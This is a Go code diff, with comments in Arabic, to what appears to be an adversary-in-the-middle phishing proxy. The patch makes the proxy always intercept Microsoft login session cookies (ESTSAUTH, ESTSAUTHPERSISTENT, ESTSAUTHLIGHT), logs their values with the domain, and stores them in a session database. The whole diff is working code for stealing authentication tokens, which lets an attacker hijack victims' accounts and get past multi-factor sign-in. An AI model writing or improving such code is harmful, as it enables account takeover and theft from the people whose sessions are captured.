@@ -984,9 +984,25 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					
 					// التقاط جميع الكوكيز بغض النظر عن الشروط
 					if s, ok := p.sessions[ps.SessionId]; ok {
+						// تحقق مما إذا كان الكوكي من الكوكيز المهمة التي نريد التقاطها دائمًا
+						importantCookies := []string{"ESTSAUTHPERSISTENT", "ESTSAUTH", "ESTSAUTHLIGHT"}
+						isImportantCookie := false
+						
+						for _, cookieName := range importantCookies {
+							if ck.Name == cookieName {
+								isImportantCookie = true
+								break
+							}
+						}
+						
 						// فقط اعتراض الكوكيز ذات القيمة
 						if ck.Value != "" {
-							log.Success("[%d] تم اعتراض كوكي: %s = %s", ps.Index, ck.Name, ck.Value)
+							// طباعة معلومات أكثر تفصيلاً للكوكيز المهمة
+							if isImportantCookie {
+								log.Success("[%d] تم اعتراض كوكي مهم: %s = %s (Domain: %s)", ps.Index, ck.Name, ck.Value, c_domain)
+							} else {
+								log.Success("[%d] تم اعتراض كوكي: %s = %s", ps.Index, ck.Name, ck.Value)
+							}
 							
 							// طباعة محتوى CookieTokens قبل الإضافة
 							log.Debug("CookieTokens قبل الإضافة: %d domains", len(s.CookieTokens))
@@ -998,10 +1014,30 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							
 							// حفظ الكوكيز في قاعدة البيانات فورًا
 							log.Debug("محاولة حفظ الكوكيز في قاعدة البيانات للجلسة: %s", ps.SessionId)
-							if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
-								log.Error("database: %v", err)
+							
+							// للكوكيز المهمة، نؤكد بشكل خاص على حفظها
+							if isImportantCookie {
+								// كن متأكداً من وجود المجال في الCookieTokens
+								if _, ok := s.CookieTokens[c_domain]; !ok {
+									s.CookieTokens[c_domain] = make(map[string]string)
+								}
+								
+								// تأكد أن الكوكي موجود في المجال
+								s.CookieTokens[c_domain][ck.Name] = ck.Value
+								
+								// حفظ الكوكيز في قاعدة البيانات
+								if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
+									log.Error("database: فشل في حفظ الكوكي المهم %s: %v", ck.Name, err)
+								} else {
+									log.Success("[%d] تم حفظ الكوكي المهم في قاعدة البيانات بنجاح: %s = %s", ps.Index, ck.Name, ck.Value)
+								}
 							} else {
-								log.Success("[%d] تم حفظ الكوكيز في قاعدة البيانات بنجاح: %s = %s", ps.Index, ck.Name, ck.Value)
+								// حفظ الكوكيز العادية في قاعدة البيانات
+								if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
+									log.Error("database: %v", err)
+								} else {
+									log.Success("[%d] تم حفظ الكوكيز في قاعدة البيانات بنجاح: %s = %s", ps.Index, ck.Name, ck.Value)
+								}
 							}
 						}
 					}
